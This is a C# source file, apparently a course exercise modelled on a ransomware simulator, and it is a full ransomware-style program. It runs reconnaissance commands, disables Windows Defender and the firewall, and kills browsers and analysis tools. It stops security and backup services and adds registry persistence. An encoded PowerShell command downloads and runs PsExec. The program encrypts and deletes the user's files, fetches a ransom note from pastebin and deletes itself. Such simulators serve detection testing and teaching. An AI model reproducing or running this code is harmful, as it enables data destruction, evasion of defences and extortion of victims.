using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;

namespace Activitat2
{
    class Program
    {
        public static bool IsAdministrator()
        {
            // Used to check if Ransim was ran as admin.
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
                      .IsInRole(WindowsBuiltInRole.Administrator);
        }
        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    rng.GetBytes(data);
                }
            }
            return data;
        }

        static void FileEncrypt(string inputFile, string password)
        {

            //generate random salt
            byte[] salt = GenerateRandomSalt();

            //create output file name
            FileStream fsCrypt = new FileStream(inputFile + ".viu", FileMode.Create);

            //convert password string to byte arrray
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            //Set Rijndael symmetric encryption algorithm
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            //http://stackoverflow.com/questions/2659214/why-do-i-need-to-use-the-rfc2898derivebytes-class-in-net-instead-of-directly
            //"What it does is repeatedly hash the user password along with the salt." High iteration counts.
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            //Cipher modes: http://security.stackexchange.com/questions/52665/which-is-the-best-cipher-mode-and-padding-mode-for-aes-encryption
            AES.Mode = CipherMode.CFB;

            // write salt to the begining of the output file, so in this case can be random every time
            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

            //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cs.Write(buffer, 0, read);
                }

                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
            }
        }

        static void ManipulateRegistry()
        {

            string destPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "supermalware.exe";


            Process.Start("cmd.exe", @"/c ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /V Malware-VIU /t REG_SZ /F /D " + destPath);
            System.Threading.Thread.Sleep(500);
        }

        static void StopServices()
        {
            // Some ransomware change the state of the services
            Process.Start(@"C:\Windows\System32\sc.exe", "config SQLTELEMETRY start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config SQLTELEMETRY$ECWDB2 start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config SQLWriter start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config SstpSvc start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config MBAMService start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config wuauserv start=disabled");

            // Stopping services so that there will be no file lock issue during encryption process
            // Only a handful of services are stopped
            Process.Start(@"C:\Windows\System32\net.exe", "stop KAVFS");
            Process.Start(@"C:\Windows\System32\net.exe", "stop klnagent");
            Process.Start(@"C:\Windows\System32\net.exe", "stop TrueKey");
            Process.Start(@"C:\Windows\System32\net.exe", "stop TrueKeyScheduler");
            Process.Start(@"C:\Windows\System32\net.exe", "stop AcronisAgent");
            Process.Start(@"C:\Windows\System32\net.exe", "stop SQLWriter");
            Process.Start(@"C:\Windows\System32\net.exe", "stop SQLBrowser");
            Process.Start(@"C:\Windows\System32\net.exe", "stop MSExchangeES");
            Process.Start(@"C:\Windows\System32\net.exe", "stop MSExchangeSRS");
            Process.Start(@"C:\Windows\System32\net.exe", "stop OracleClientCache80");
            Process.Start(@"C:\Windows\System32\net.exe", "stop ShMonitor");
            Process.Start(@"C:\Windows\System32\net.exe", "stop McAfeeEngineService");
            Process.Start(@"C:\Windows\System32\net.exe", "stop MBEndpointAgent");
            Process.Start(@"C:\Windows\System32\net.exe", "stop EhttpSrv");
        }

        static void RunPsExec()
        {
            // Fetch and run PsExec
            /* $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -URI https://live.sysinternals.com/PsExec64.exe -Out $env:temp\psexec.exe; Start-Process $env:temp\psexec.exe -ArgumentList "-r SysUpdate ipconfig" -NoNewWindow -Wait; del $env:temp\psexec.exe */
            Process.Start("powershell.exe", "-nop - win hid - exec bypass - encodedcommand JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAJwA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBsAGkAdgBlAC4AcwB5AHMAaQBuAHQAZQByAG4AYQBsAHMALgBjAG8AbQAvAFAAcwBFAHgAZQBjADYANAAuAGUAeABlACAALQBPAHUAdAAgACQAZQBuAHYAOgB0AGUAbQBwAFwAcABzAGUAeABlAGMALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZQBuAHYAOgB0AGUAbQBwAFwAcABzAGUAeABlAGMALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0AcgAgAFMAeQBzAFUAcABkAGEAdABlACAAaQBwAGMAbwBuAGYAaQBnACIAIAAtAE4AbwBOAGUAdwBXAGkAbgBkAG8AdwAgAC0AVwBhAGkAdAA7ACAAZABlAGwAIAAkAGUAbgB2ADoAdABlAG0AcABcAHAAcwBlAHgAZQBjAC4AZQB4AGUADQAKAA==");
        }

        static void DisableFirewall()
        {
            // Disable Defender Firewall
            Process.Start(@"C:\Windows\System32\netsh.exe", "advfirewall set allprofiles state off");
            System.Threading.Thread.Sleep(3000);
            // Enable it back
            Process.Start(@"C:\Windows\System32\netsh.exe", "advfirewall set allprofiles state on");
            System.Threading.Thread.Sleep(500);

        }

        static void DisableAV()
        {
            // Although AV is already disabled, this is to monitor for AV disabling attempts

            // Disable Defender's Real-Time Monitoring
            Process.Start("powershell.exe", "-command Set-MpPreference -DisableRealtimeMonitoring 1");

            // Disable Defender's Controlled Folder Access
            Process.Start("powershell.exe", "-command Set-MpPreference -EnableControlledFolderAccess Disabled");
        }

        static void RunRecon()
        {
            // Runs a barrage of reconnaissance commands
            Process.Start("systeminfo.exe");
            Process.Start("whoami.exe", "/all");
            Process.Start("ipconfig.exe", "/all");
            Process.Start("route.exe", "print");
            Process.Start("net.exe", "user");
            Process.Start("arp.exe", "-a");
            Process.Start("net.exe", "share");
            Process.Start("net.exe", "view /all");
            Process.Start("net.exe", "view /all /domain");
            Process.Start("net.exe", "localgroup");
            Process.Start("net.exe", "config workstation");
            Process.Start("netstat.exe", "-ano");

            // Query installed AV
            Process.Start("wmic.exe", @"/Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List");

            // Query VMs on the system
            Process.Start("powershell.exe", "-command Get-VM");
        }

        static void KillProcess() 
        {

            foreach (var process in Process.GetProcesses())
            {
                switch(process.ProcessName)
                {
                    case "firefox":
                        process.Kill();
                        break;
                    case "winword":
                        process.Kill();
                        break;
                    case "wordpad":
                        process.Kill();
                        break;
                    case "processhacker":
                        process.Kill();
                        break;
                    case "procexp":
                        process.Kill();
                        break;
                    case "pestudio":
                        process.Kill();
                        break;
                    case "notepad":
                        process.Kill();
                        break;
                    case "outlook":
                        process.Kill();
                        break;
                    default:
                        break;
                }
            }
        }

        static void RansomNoteDownload(string ransomNote)
        {
            WebClient client = new WebClient();
            const string pastebin_url = "https://pastebin.com/dl/AwQWBWkV";
            client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)");
            client.Headers.Add("referer", "https://pastebin.com");
            client.DownloadFile(pastebin_url, ransomNote);
        }

        static void LocationCheck()
        {
            // Use ipinfo to obtain geolocation information
            string responseJSON = string.Empty;
            string url = @"https://ipinfo.io/json";

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.AutomaticDecompression = DecompressionMethods.GZip;

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            using (Stream stream = response.GetResponseStream())
            using (StreamReader reader = new StreamReader(stream))
            {
                responseJSON = reader.ReadToEnd();
            }

            Console.WriteLine(responseJSON);
        }

        static void CopyToTemp()
        {
            string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string destPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "supermalware.exe";

            System.IO.File.Copy(exePath, destPath, true);
        }

        static void SelfDelete()
        {
            // Delete itself
            string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            Process.Start("cmd.exe", "/c ping 1.1.1.1 -n 5 > Nul & Del " + exePath + " /F /Q");
        }

        static void Main(string[] args)
        {
            const string targetDir = "Desktop\\Documentos";
            const string ransomNote = "ransom_note.txt";
            const string tempDir = "VIU";
            const string randomPassword = "VIU2022";
            string userDirPath = Environment.GetEnvironmentVariable("USERPROFILE");
            string targetDirPath = userDirPath + @"\" + targetDir;
            string[] files = Directory.GetFiles(targetDirPath, "*");

            string tempDirPath = userDirPath + @"\" + tempDir;

            if (IsAdministrator() == true)
            {
                Console.WriteLine("Lanza el ejecutable como administrador!");
                Console.WriteLine("Saliendo...");
                return;
            }

            if (!Directory.Exists(targetDirPath))
            {
                Console.WriteLine("Crea la carpeta documentos en el escritorio para poder lanzar la muestra correctamente!!");
                Console.WriteLine("Saliendo...");
                return;
            }

            LocationCheck();

            CopyToTemp();

            RunRecon();
            DisableAV();
            DisableFirewall();
            KillProcess();

            ManipulateRegistry();
            StopServices();

            Console.WriteLine("Empieza el cifrado");

            foreach (string file in files)
            {
                FileEncrypt(file, randomPassword);
                File.Delete(file);
            }
            RansomNoteDownload(ransomNote);

            Process.Start("notepad.exe", ransomNote);

            SelfDelete();
        }
    }
}
